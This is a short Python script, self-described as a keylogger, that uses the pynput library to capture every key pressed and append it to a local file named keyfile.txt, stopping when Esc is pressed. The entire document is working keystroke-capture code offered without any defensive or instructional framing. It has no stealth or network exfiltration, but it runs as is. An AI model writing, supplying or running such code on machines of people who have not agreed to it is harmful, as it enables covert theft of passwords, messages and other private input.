from pynput import keyboard


def keyPressed(key):
  print(str(key))
  with open("keyfile.txt", 'a') as logKey:
    try:
      char = key.char
      logKey.write(char)
    except AttributeError:
            # Handle special keys (space, enter, etc.)
            if key == keyboard.Key.space:
                logKey.write(' ')
            elif key == keyboard.Key.enter:
                logKey.write('\n')
            else:
                logKey.write(f' [{key}] ')
    except Exception as e:
            print(f"Error getting char: {e}")
      
def on_release(key):
    if key == keyboard.Key.esc:
        print("Stopping keylogger...")
        return False


if  __name__=="__main__":
  listener=keyboard.Listener(on_press=keyPressed, on_release=on_release)
  listener.start()
  listener.join()
  input()